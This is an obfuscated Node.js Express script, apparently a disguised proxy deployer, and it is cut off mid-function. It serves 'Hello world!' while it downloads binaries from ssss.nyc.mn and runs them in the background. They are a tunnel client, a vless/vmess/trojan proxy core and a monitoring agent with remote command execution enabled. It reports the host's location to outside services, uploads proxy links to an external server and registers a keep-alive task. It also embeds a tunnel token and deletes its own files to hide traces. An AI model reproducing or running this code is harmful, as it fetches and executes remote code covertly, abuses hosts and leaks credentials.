const _0x85b5bd=_0x51f6;(function(_0x1fccfc,_0x4ccd21){const _0x5000ed=_0x51f6,_0x4891b7=_0x1fccfc();while(!![]){try{const _0x47ad17=-parseInt(_0x5000ed(0xf3))/0x1*(parseInt(_0x5000ed(0xd6))/0x2)+-parseInt(_0x5000ed(0x12f))/0x3+parseInt(_0x5000ed(0xb9))/0x4*(parseInt(_0x5000ed(0x105))/0x5)+parseInt(_0x5000ed(0xc1))/0x6+parseInt(_0x5000ed(0xe0))/0x7*(-parseInt(_0x5000ed(0x161))/0x8)+parseInt(_0x5000ed(0x15b))/0x9*(-parseInt(_0x5000ed(0x146))/0xa)+parseInt(_0x5000ed(0xf2))/0xb;if(_0x47ad17===_0x4ccd21)break;else _0x4891b7['push'](_0x4891b7['shift']());}catch(_0x211707){_0x4891b7['push'](_0x4891b7['shift']());}}}(_0x4716,0x3113b));const express=require(_0x85b5bd(0x137)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x85b5bd(0xc5)),{promisify}=require(_0x85b5bd(0xf7)),exec=promisify(require(_0x85b5bd(0x13a))[_0x85b5bd(0x16f)]),{execSync}=require(_0x85b5bd(0x13a)),UPLOAD_URL=process[_0x85b5bd(0x164)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x85b5bd(0x164)][_0x85b5bd(0xe5)]||'',AUTO_ACCESS=process[_0x85b5bd(0x164)][_0x85b5bd(0xa6)]||![],FILE_PATH=process[_0x85b5bd(0x164)][_0x85b5bd(0x121)]||'./tmp',SUB_PATH=process[_0x85b5bd(0x164)][_0x85b5bd(0xef)]||'1029',PORT=process[_0x85b5bd(0x164)][_0x85b5bd(0x138)]||process[_0x85b5bd(0x164)]['PORT']||0xbb8,UUID=process[_0x85b5bd(0x164)]['UUID']||_0x85b5bd(0x12a),NEZHA_SERVER=process[_0x85b5bd(0x164)][_0x85b5bd(0xe2)]||'',NEZHA_PORT=process['env'][_0x85b5bd(0x108)]||'',NEZHA_KEY=process['env'][_0x85b5bd(0xdd)]||'',ARGO_DOMAIN=process['env'][_0x85b5bd(0xe6)]||_0x85b5bd(0x14c),ARGO_AUTH=process[_0x85b5bd(0x164)][_0x85b5bd(0xe7)]||_0x85b5bd(0x155),ARGO_PORT=process[_0x85b5bd(0x164)]['ARGO_PORT']||0x1f41,CFIP=process['env'][_0x85b5bd(0x15c)]||'cdns.doon.eu.org',CFPORT=process[_0x85b5bd(0x164)]['CFPORT']||0x1bb,NAME=process['env']['NAME']||_0x85b5bd(0x123);function _0x4716(){const _0x1c0ab1=['pop','config.json','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','2083','clear','https://amd64.ssss.nyc.mn/web','NEZHA_KEY','isFile','all','1389073kYOpsy','country_code','NEZHA_SERVER','success','substring','PROJECT_URL','ARGO_DOMAIN','ARGO_AUTH','Unhandled\x20error\x20in\x20startserver:','win32','Unknown','unshift','tls','https://arm64.ssss.nyc.mn/bot','https://arm64.ssss.nyc.mn/agent','SUB_PATH','?security=tls&sni=','post','10246159SuDlvQ','5doKaFm','/api/delete-nodes','Empowerment\x20failed\x20for\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','util','\x20successfully','message','listen','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','platform','/vless-argo','/trojan-argo','https://ipapi.co/json/','/vmess-argo?ed=2560','https://amd64.ssss.nyc.mn/agent','ARGO_DOMAIN:','&path=%2Ftrojan-argo%3Fed%3D2560#','\x0avless://','1786905ehNwwJ','\x20failed:\x20','xtls-rprx-vision','NEZHA_PORT','\x0a\x0atrojan://','web\x20running\x20error:\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','http://ip-api.com/json/','\x20-c\x20','stream','https://arm64.ssss.nyc.mn/web','boot.log','Subscription\x20uploaded\x20successfully','&fp=firefox&type=ws&host=','includes','Content-Type','mkdirSync','error','send','8443','2087','countryCode','\x0a\x0avmess://','charAt','false','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x20-p\x20','tunnel.json','FILE_PATH','true','mcl0614','forEach','Error\x20executing\x20command:\x20','toString','\x0a\x20\x20tunnel:\x20','join','&path=%2Fvless-argo%3Fed%3D2560#','aaba356d-d8d1-4e67-9145-cb20a4acb94c','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Error\x20reading\x20boot.log:','test','vless','917766kzhQDe','TunnelSecret','blackhole','\x20already\x20exists','status','then','2053','del\x20/f\x20/q\x20','express','SERVER_PORT','response','child_process','arch','arm64','App\x20is\x20running','https://oooo.serv00.net/add-url','/sub.txt\x20saved\x20successfully','amd','length','stringify','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','get','existsSync','42270cMteTk','Error\x20in\x20startserver:','none','quic','catch','unlinkSync','mcl0614.mjwmcl.ddns-ip.net','trojan','http','\x20>/dev/null\x202>&1','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','automatic\x20access\x20task\x20added\x20successfully','readFileSync','/dev/null','close','eyJhIjoiMWE0MGVmNTY2NzA5ZWFmYTUxMDYxZGZkYmQ5NGQyYTQiLCJ0IjoiMjIyNzJlOGYtOTVmMy00ZjVhLTgwZDctNzU4ODkwZmQyODc0IiwicyI6IlptVXpNV05pT1RJdE5EVTJZUzAwWmpsbExUazRabVl0TWpJeE1UZGpOR0psT0RZeCJ9','/config.json\x20>/dev/null\x202>&1\x20&','443','vmess','/tunnel.yml\x20run','utf-8','666Uachla','CFIP','\x0a\x20\x20credentials-file:\x20','\x20>\x20nul\x202>&1','createWriteStream','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','16MLBaex','/vmess-argo','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','env','?encryption=none&security=tls&sni=','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','push','/api/add-nodes','\x20is\x20running','\x0a\x20\x20\x20\x20','list.txt','data','log','\x20is\x20created','exec','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','map','AUTO_ACCESS','npm\x20running\x20error:\x20','filter','direct','http\x20server\x20is\x20running\x20on\x20port:','basename','\x20-c\x20\x22','firefox','pipe','ArgoDomain:','from','.exe\x20>\x20nul\x202>&1','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','rm\x20-rf\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','arm','\x20>/dev/null\x202>&1\x20&','https+local://8.8.8.8/dns-query','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','4BXzlwz','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','application/json','\x20-s\x20','/api/add-subscriptions','pkill\x20-f\x20\x22[','https://arm64.ssss.nyc.mn/v1','127.0.0.1','526872WawnSB','Download\x20','tunnel.yml','split','path','fileUrl','block','base64','random','nohup\x20','sub.txt','tcp','chmod','Error\x20downloading\x20files:','floor','\x22\x20>\x20/dev/null\x202>&1','config.yaml','match','freedom','writeFileSync','org','64018RtswCK'];_0x4716=function(){return _0x1c0ab1;};return _0x4716();}!fs[_0x85b5bd(0x145)](FILE_PATH)?(fs[_0x85b5bd(0x115)](FILE_PATH),console[_0x85b5bd(0x16d)](FILE_PATH+_0x85b5bd(0x16e))):console[_0x85b5bd(0x16d)](FILE_PATH+_0x85b5bd(0x132));function generateRandomName(){const _0x159f0f=_0x85b5bd,_0x4ac14b='abcdefghijklmnopqrstuvwxyz';let _0xfb444d='';for(let _0x340a2b=0x0;_0x340a2b<0x6;_0x340a2b++){_0xfb444d+=_0x4ac14b['charAt'](Math[_0x159f0f(0xcf)](Math[_0x159f0f(0xc9)]()*_0x4ac14b[_0x159f0f(0x141)]));}return _0xfb444d;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x85b5bd(0x128)](FILE_PATH,phpName),webPath=path[_0x85b5bd(0x128)](FILE_PATH,webName),botPath=path[_0x85b5bd(0x128)](FILE_PATH,botName),subPath=path[_0x85b5bd(0x128)](FILE_PATH,_0x85b5bd(0xcb)),listPath=path[_0x85b5bd(0x128)](FILE_PATH,_0x85b5bd(0x16b)),bootLogPath=path['join'](FILE_PATH,_0x85b5bd(0x110)),configPath=path[_0x85b5bd(0x128)](FILE_PATH,_0x85b5bd(0xd8));function deleteNodes(){const _0x5564de=_0x85b5bd;try{if(!UPLOAD_URL)return;if(!fs[_0x5564de(0x145)](subPath))return;let _0x5128b3;try{_0x5128b3=fs[_0x5564de(0x152)](subPath,_0x5564de(0x15a));}catch{return null;}const _0x52fe6b=Buffer['from'](_0x5128b3,_0x5564de(0xc8))[_0x5564de(0x126)](_0x5564de(0x15a)),_0x21eb55=_0x52fe6b['split']('\x0a')[_0x5564de(0xa8)](_0x258831=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5564de(0x12d)](_0x258831));if(_0x21eb55[_0x5564de(0x141)]===0x0)return;return axios[_0x5564de(0xf1)](UPLOAD_URL+_0x5564de(0xf4),JSON[_0x5564de(0x142)]({'nodes':_0x21eb55}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x4f50b9=>{return null;}),null;}catch(_0x550b08){return null;}}function cleanupOldFiles(){try{const _0x53c9c7=fs['readdirSync'](FILE_PATH);_0x53c9c7['forEach'](_0x428cae=>{const _0x15509e=_0x51f6,_0x840c4b=path[_0x15509e(0x128)](FILE_PATH,_0x428cae);try{const _0x1bf220=fs['statSync'](_0x840c4b);_0x1bf220[_0x15509e(0xde)]()&&fs[_0x15509e(0x14b)](_0x840c4b);}catch(_0x582a73){}});}catch(_0x43e874){}}app[_0x85b5bd(0x144)]('/',function(_0x3bad7f,_0xa9b85e){const _0x2d7f95=_0x85b5bd;_0xa9b85e[_0x2d7f95(0x117)]('Hello\x20world!');});async function generateConfig(){const _0x206e6f=_0x85b5bd,_0x2279f5={'log':{'access':_0x206e6f(0x153),'error':_0x206e6f(0x153),'loglevel':_0x206e6f(0x148)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x206e6f(0x107)}],'decryption':_0x206e6f(0x148),'fallbacks':[{'dest':0xbb9},{'path':_0x206e6f(0xfd),'dest':0xbba},{'path':_0x206e6f(0x162),'dest':0xbbb},{'path':_0x206e6f(0xfe),'dest':0xbbc}]},'streamSettings':{'network':_0x206e6f(0xcc)}},{'port':0xbb9,'listen':_0x206e6f(0xc0),'protocol':_0x206e6f(0x12e),'settings':{'clients':[{'id':UUID}],'decryption':_0x206e6f(0x148)},'streamSettings':{'network':'tcp','security':_0x206e6f(0x148)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x206e6f(0x12e),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x206e6f(0x148)},'streamSettings':{'network':'ws','security':_0x206e6f(0x148),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x206e6f(0x14e),'tls',_0x206e6f(0x149)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x206e6f(0xc0),'protocol':_0x206e6f(0x158),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x206e6f(0x162)}},'sniffing':{'enabled':!![],'destOverride':[_0x206e6f(0x14e),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x206e6f(0x14d),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x206e6f(0x14e),_0x206e6f(0xec),_0x206e6f(0x149)],'metadataOnly':![]}}],'dns':{'servers':[_0x206e6f(0xb7)]},'outbounds':[{'protocol':_0x206e6f(0xd3),'tag':_0x206e6f(0xa9)},{'protocol':_0x206e6f(0x131),'tag':_0x206e6f(0xc7)}]};fs[_0x206e6f(0xd4)](path[_0x206e6f(0x128)](FILE_PATH,_0x206e6f(0xd8)),JSON[_0x206e6f(0x142)](_0x2279f5,null,0x2));}function getSystemArchitecture(){const _0x1ee414=_0x85b5bd,_0x52adaf=os[_0x1ee414(0x13b)]();return _0x52adaf===_0x1ee414(0xb5)||_0x52adaf===_0x1ee414(0x13c)||_0x52adaf==='aarch64'?_0x1ee414(0xb5):_0x1ee414(0x140);}function downloadFile(_0x3467a9,_0x7a4b34,_0x332bff){const _0xdb9249=_0x85b5bd,_0x5de8b5=_0x3467a9;!fs[_0xdb9249(0x145)](FILE_PATH)&&fs[_0xdb9249(0x115)](FILE_PATH,{'recursive':!![]});const _0x570943=fs[_0xdb9249(0x15f)](_0x5de8b5);axios({'method':'get','url':_0x7a4b34,'responseType':_0xdb9249(0x10e)})[_0xdb9249(0x134)](_0x294455=>{const _0x2170f0=_0xdb9249;_0x294455['data'][_0x2170f0(0xae)](_0x570943),_0x570943['on']('finish',()=>{const _0x466ba5=_0x2170f0;_0x570943[_0x466ba5(0x154)](),console[_0x466ba5(0x16d)]('Download\x20'+path[_0x466ba5(0xab)](_0x5de8b5)+_0x466ba5(0xf8)),_0x332bff(null,_0x5de8b5);}),_0x570943['on'](_0x2170f0(0x116),_0x19bcbe=>{const _0x11b663=_0x2170f0;fs['unlink'](_0x5de8b5,()=>{});const _0x5b4790=_0x11b663(0xc2)+path[_0x11b663(0xab)](_0x5de8b5)+_0x11b663(0x106)+_0x19bcbe[_0x11b663(0xf9)];console[_0x11b663(0x116)](_0x5b4790),_0x332bff(_0x5b4790);});})[_0xdb9249(0x14a)](_0x927f1=>{const _0x53e1d0=_0xdb9249,_0x31d3ce=_0x53e1d0(0xc2)+path['basename'](_0x5de8b5)+_0x53e1d0(0x106)+_0x927f1[_0x53e1d0(0xf9)];console[_0x53e1d0(0x116)](_0x31d3ce),_0x332bff(_0x31d3ce);});}async function downloadFilesAndRun(){const _0x5f578f=_0x85b5bd,_0x26a0ef=getSystemArchitecture(),_0x3b09d9=getFilesForArchitecture(_0x26a0ef);if(_0x3b09d9[_0x5f578f(0x141)]===0x0){console[_0x5f578f(0x16d)](_0x5f578f(0x166));return;}const _0x1cd6a1=_0x3b09d9[_0x5f578f(0xa5)](_0x1c889c=>{return new Promise((_0x446ca1,_0x22459)=>{const _0x5a4766=_0x51f6;downloadFile(_0x1c889c['fileName'],_0x1c889c[_0x5a4766(0xc6)],(_0x4cba42,_0xf088b4)=>{_0x4cba42?_0x22459(_0x4cba42):_0x446ca1(_0xf088b4);});});});try{await Promise[_0x5f578f(0xdf)](_0x1cd6a1);}catch(_0x8c17c1){console[_0x5f578f(0x116)](_0x5f578f(0xce),_0x8c17c1);return;}function _0x15e6ee(_0x63fd8){const _0x59a178=_0x5f578f,_0x3bf9f7=0x1fd;_0x63fd8[_0x59a178(0x124)](_0x349586=>{const _0x59439d=_0x59a178;fs['existsSync'](_0x349586)&&fs[_0x59439d(0xcd)](_0x349586,_0x3bf9f7,_0x555760=>{const _0x44baab=_0x59439d;_0x555760?console['error'](_0x44baab(0xf5)+_0x349586+':\x20'+_0x555760):console[_0x44baab(0x16d)]('Empowerment\x20success\x20for\x20'+_0x349586+':\x20'+_0x3bf9f7[_0x44baab(0x126)](0x8));});});}const _0x278a08=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x15e6ee(_0x278a08);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x212921=NEZHA_SERVER[_0x5f578f(0x113)](':')?NEZHA_SERVER[_0x5f578f(0xc4)](':')[_0x5f578f(0xd7)]():'',_0x47b939=new Set([_0x5f578f(0x157),_0x5f578f(0x118),'2096',_0x5f578f(0x119),'2083',_0x5f578f(0x135)]),_0x5d21de=_0x47b939['has'](_0x212921)?_0x5f578f(0x122):_0x5f578f(0x11d),_0x8c69e='\x0aclient_secret:\x20'+NEZHA_KEY+_0x5f578f(0x163)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x5d21de+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](path[_0x5f578f(0x128)](FILE_PATH,_0x5f578f(0xd1)),_0x8c69e);const _0x3340e9='nohup\x20'+phpPath+_0x5f578f(0xac)+FILE_PATH+_0x5f578f(0xa4);try{await exec(_0x3340e9),console[_0x5f578f(0x16d)](phpName+'\x20is\x20running'),await new Promise(_0x42e196=>setTimeout(_0x42e196,0x3e8));}catch(_0x978e3f){console[_0x5f578f(0x116)]('php\x20running\x20error:\x20'+_0x978e3f);}}else{let _0x3f9356='';const _0x53c0af=[_0x5f578f(0x157),_0x5f578f(0x118),'2096',_0x5f578f(0x119),_0x5f578f(0xda),'2053'];_0x53c0af[_0x5f578f(0x113)](NEZHA_PORT)&&(_0x3f9356='--tls');const _0x249a39=_0x5f578f(0xca)+npmPath+_0x5f578f(0xbc)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5f578f(0x11f)+NEZHA_KEY+'\x20'+_0x3f9356+_0x5f578f(0xfb);try{await exec(_0x249a39),console['log'](npmName+_0x5f578f(0x169)),await new Promise(_0x9ff516=>setTimeout(_0x9ff516,0x3e8));}catch(_0x295a8c){console[_0x5f578f(0x116)](_0x5f578f(0xa7)+_0x295a8c);}}}else console['log'](_0x5f578f(0xf6));const _0x1138bc=_0x5f578f(0xca)+webPath+_0x5f578f(0x10d)+FILE_PATH+_0x5f578f(0x156);try{await exec(_0x1138bc),console[_0x5f578f(0x16d)](webName+'\x20is\x20running'),await new Promise(_0x135319=>setTimeout(_0x135319,0x3e8));}catch(_0x2e3947){console[_0x5f578f(0x116)](_0x5f578f(0x10a)+_0x2e3947);}if(fs[_0x5f578f(0x145)](botPath)){let _0x5623f5;if(ARGO_AUTH[_0x5f578f(0xd2)](/^[A-Z0-9a-z=]{120,250}$/))_0x5623f5=_0x5f578f(0xd9)+ARGO_AUTH;else ARGO_AUTH[_0x5f578f(0xd2)](/TunnelSecret/)?_0x5623f5=_0x5f578f(0x150)+FILE_PATH+_0x5f578f(0x159):_0x5623f5=_0x5f578f(0x160)+FILE_PATH+_0x5f578f(0x12b)+ARGO_PORT;try{await exec(_0x5f578f(0xca)+botPath+'\x20'+_0x5623f5+_0x5f578f(0xb6)),console[_0x5f578f(0x16d)](botName+'\x20is\x20running'),await new Promise(_0x2745d0=>setTimeout(_0x2745d0,0x7d0));}catch(_0xabd395){console['error'](_0x5f578f(0x125)+_0xabd395);}}await new Promise(_0x267a76=>setTimeout(_0x267a76,0x1388));}function getFilesForArchitecture(_0x46b091){const _0x1a5272=_0x85b5bd;let _0x9df868;_0x46b091===_0x1a5272(0xb5)?_0x9df868=[{'fileName':webPath,'fileUrl':_0x1a5272(0x10f)},{'fileName':botPath,'fileUrl':_0x1a5272(0xed)}]:_0x9df868=[{'fileName':webPath,'fileUrl':_0x1a5272(0xdc)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3070e6=_0x46b091===_0x1a5272(0xb5)?_0x1a5272(0xee):_0x1a5272(0x101);_0x9df868[_0x1a5272(0xeb)]({'fileName':npmPath,'fileUrl':_0x3070e6});}else{const _0x17db77=_0x46b091===_0x1a5272(0xb5)?_0x1a5272(0xbf):'https://amd64.ssss.nyc.mn/v1';_0x9df868[_0x1a5272(0xeb)]({'fileName':phpPath,'fileUrl':_0x17db77});}}return _0x9df868;}function argoType(){const _0x270eb9=_0x85b5bd;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x270eb9(0x16d)](_0x270eb9(0xba));return;}if(ARGO_AUTH[_0x270eb9(0x113)](_0x270eb9(0x130))){fs[_0x270eb9(0xd4)](path[_0x270eb9(0x128)](FILE_PATH,_0x270eb9(0x120)),ARGO_AUTH);const _0x9e68bb=_0x270eb9(0x127)+ARGO_AUTH[_0x270eb9(0xc4)]('\x22')[0xb]+_0x270eb9(0x15d)+path[_0x270eb9(0x128)](FILE_PATH,_0x270eb9(0x120))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x270eb9(0x11e)+ARGO_PORT+_0x270eb9(0xb2);fs[_0x270eb9(0xd4)](path[_0x270eb9(0x128)](FILE_PATH,_0x270eb9(0xc3)),_0x9e68bb);}else console[_0x270eb9(0x16d)](_0x270eb9(0xb8));}async function extractDomains(){const _0xe2c562=_0x85b5bd;let _0x31e269;if(ARGO_AUTH&&ARGO_DOMAIN)_0x31e269=ARGO_DOMAIN,console[_0xe2c562(0x16d)](_0xe2c562(0x102),_0x31e269),await _0x219320(_0x31e269);else try{const _0x13e3a4=fs[_0xe2c562(0x152)](path[_0xe2c562(0x128)](FILE_PATH,'boot.log'),_0xe2c562(0x15a)),_0x52fb89=_0x13e3a4[_0xe2c562(0xc4)]('\x0a'),_0x2b0362=[];_0x52fb89[_0xe2c562(0x124)](_0x5ea521=>{const _0x305c4a=_0xe2c562,_0x5dd67d=_0x5ea521[_0x305c4a(0xd2)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5dd67d){const _0x18a2e8=_0x5dd67d[0x1];_0x2b0362[_0x305c4a(0x167)](_0x18a2e8);}});if(_0x2b0362['length']>0x0)_0x31e269=_0x2b0362[0x0],console[_0xe2c562(0x16d)](_0xe2c562(0xaf),_0x31e269),await _0x219320(_0x31e269);else{console[_0xe2c562(0x16d)](_0xe2c562(0xb4)),fs[_0xe2c562(0x14b)](path[_0xe2c562(0x128)](FILE_PATH,_0xe2c562(0x110)));async function _0x5397c9(){const _0x97a909=_0xe2c562;try{process['platform']===_0x97a909(0xe9)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x97a909(0xb1)):await exec(_0x97a909(0xbe)+botName[_0x97a909(0x11c)](0x0)+']'+botName[_0x97a909(0xe4)](0x1)+_0x97a909(0xd0));}catch(_0x2da096){}}_0x5397c9(),await new Promise(_0x5579e1=>setTimeout(_0x5579e1,0xbb8));const _0x3278f6=_0xe2c562(0x160)+FILE_PATH+_0xe2c562(0x12b)+ARGO_PORT;try{await exec(_0xe2c562(0xca)+botPath+'\x20'+_0x3278f6+_0xe2c562(0xb6)),console[_0xe2c562(0x16d)](botName+'\x20is\x20running'),await new Promise(_0x4fb885=>setTimeout(_0x4fb885,0xbb8)),await extractDomains();}catch(_0x2b2715){console['error'](_0xe2c562(0x125)+_0x2b2715);}}}catch(_0x4ce128){console[_0xe2c562(0x116)](_0xe2c562(0x12c),_0x4ce128);}async function _0x33ff53(){const _0x2b1f38=_0xe2c562;try{const _0x5c9abc=await axios['get'](_0x2b1f38(0xff),{'timeout':0xbb8});if(_0x5c9abc['data']&&_0x5c9abc['data'][_0x2b1f38(0xe1)]&&_0x5c9abc[_0x2b1f38(0x16c)][_0x2b1f38(0xd5)])return _0x5c9abc[_0x2b1f38(0x16c)][_0x2b1f38(0xe1)]+'_'+_0x5c9abc[_0x2b1f38(0x16c)]['org'];}catch(_0x2b98e4){try{const _0x2e2b88=await axios[_0x2b1f38(0x144)](_0x2b1f38(0x10c),{'timeout':0xbb8});if(_0x2e2b88['data']&&_0x2e2b88[_0x2b1f38(0x16c)][_0x2b1f38(0x133)]===_0x2b1f38(0xe3)&&_0x2e2b88['data'][_0x2b1f38(0x11a)]&&_0x2e2b88[_0x2b1f38(0x16c)]['org'])return _0x2e2b88[_0x2b1f38(0x16c)][_0x2b1f38(0x11a)]+'_'+_0x2e2b88['data'][_0x2b1f38(0xd5)];}catch(_0xdbff3d){}}return _0x2b1f38(0xea);}async function _0x219320(_0x6005c4){const _0x398558=await _0x33ff53(),_0x38997c=NAME?NAME+'-'+_0x398558:_0x398558;return new Promise(_0x58937d=>{setTimeout(()=>{const _0x44214f=_0x51f6,_0x4e0960={'v':'2','ps':''+_0x38997c,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x44214f(0x148),'net':'ws','type':_0x44214f(0x148),'host':_0x6005c4,'path':_0x44214f(0x100),'tls':_0x44214f(0xec),'sni':_0x6005c4,'alpn':'','fp':_0x44214f(0xad)},_0x3fb3d0=_0x44214f(0x104)+UUID+'@'+CFIP+':'+CFPORT+_0x44214f(0x165)+_0x6005c4+'&fp=firefox&type=ws&host='+_0x6005c4+_0x44214f(0x129)+_0x38997c+_0x44214f(0x11b)+Buffer['from'](JSON[_0x44214f(0x142)](_0x4e0960))[_0x44214f(0x126)](_0x44214f(0xc8))+_0x44214f(0x109)+UUID+'@'+CFIP+':'+CFPORT+_0x44214f(0xf0)+_0x6005c4+_0x44214f(0x112)+_0x6005c4+_0x44214f(0x103)+_0x38997c+_0x44214f(0x16a);console[_0x44214f(0x16d)](Buffer['from'](_0x3fb3d0)['toString'](_0x44214f(0xc8))),fs['writeFileSync'](subPath,Buffer[_0x44214f(0xb0)](_0x3fb3d0)[_0x44214f(0x126)]('base64')),console[_0x44214f(0x16d)](FILE_PATH+_0x44214f(0x13f)),uploadNodes(),app[_0x44214f(0x144)]('/'+SUB_PATH,(_0x391220,_0x21f9eb)=>{const _0x49b880=_0x44214f,_0x2eb9bf=Buffer[_0x49b880(0xb0)](_0x3fb3d0)['toString'](_0x49b880(0xc8));_0x21f9eb['set'](_0x49b880(0x114),'text/plain;\x20charset=utf-8'),_0x21f9eb['send'](_0x2eb9bf);}),_0x58937d(_0x3fb3d0);},0x7d0);});}}async function uploadNodes(){const _0x32ab8d=_0x85b5bd;if(UPLOAD_URL&&PROJECT_URL){const _0x59a6fe=PROJECT_URL+'/'+SUB_PATH,_0xa3b21d={'subscription':[_0x59a6fe]};try{const _0x5ed17b=await axios[_0x32ab8d(0xf1)](UPLOAD_URL+_0x32ab8d(0xbd),_0xa3b21d,{'headers':{'Content-Type':_0x32ab8d(0xbb)}});return _0x5ed17b&&_0x5ed17b['status']===0xc8?(console['log'](_0x32ab8d(0x111)),_0x5ed17b):null;}catch(_0x3335cd){if(_0x3335cd[_0x32ab8d(0x139)]){if(_0x3335cd[_0x32ab8d(0x139)][_0x32ab8d(0x133)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x32ab8d(0x145)](listPath))return;const _0x52fe53=fs['readFileSync'](listPath,_0x32ab8d(0x15a)),_0x37cef7=_0x52fe53[_0x32ab8d(0xc4)]('\x0a')[_0x32ab8d(0xa8)](_0x334925=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x32ab8d(0x12d)](_0x334925));if(_0x37cef7[_0x32ab8d(0x141)]===0x0)return;const _0xcc8964=JSON[_0x32ab8d(0x142)]({'nodes':_0x37cef7});try{const _0x5bd78f=await axios[_0x32ab8d(0xf1)](UPLOAD_URL+_0x32ab8d(0x168),_0xcc8964,{'headers':{'Content-Type':'application/json'}});return _0x5bd78f&&_0x5bd78f[_0x32ab8d(0x133)]===0xc8?(console[_0x32ab8d(0x16d)]('Nodes\x20uploaded\x20successfully'),_0x5bd78f):null;}catch(_0x518196){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0xb8f830=_0x51f6,_0x552d1f=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x552d1f[_0xb8f830(0x167)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x552d1f['push'](phpPath);process[_0xb8f830(0xfc)]===_0xb8f830(0xe9)?exec(_0xb8f830(0x136)+_0x552d1f[_0xb8f830(0x128)]('\x20')+_0xb8f830(0x15e),_0x17daed=>{const _0x5f170b=_0xb8f830;console[_0x5f170b(0xdb)](),console['log'](_0x5f170b(0x13d)),console[_0x5f170b(0x16d)](_0x5f170b(0x143));}):exec(_0xb8f830(0xb3)+_0x552d1f[_0xb8f830(0x128)]('\x20')+_0xb8f830(0x14f),_0x4e54c6=>{const _0x4f80e1=_0xb8f830;console[_0x4f80e1(0xdb)](),console[_0x4f80e1(0x16d)](_0x4f80e1(0x13d)),console['log'](_0x4f80e1(0x143));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2d1624=_0x85b5bd;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x341e27=await axios[_0x2d1624(0xf1)](_0x2d1624(0x13e),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console['log'](_0x2d1624(0x151)),_0x341e27;}catch(_0x2fb298){return console[_0x2d1624(0x116)](_0x2d1624(0x10b)+_0x2fb298['message']),null;}}async function startserver(){const _0x50a684=_0x85b5bd;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x598d4e){console[_0x50a684(0x116)](_0x50a684(0x147),_0x598d4e);}}function _0x51f6(_0x46b4bd,_0x3edb48){_0x46b4bd=_0x46b4bd-0xa4;const _0x4716b8=_0x4716();let _0x51f686=_0x4716b8[_0x46b4bd];return 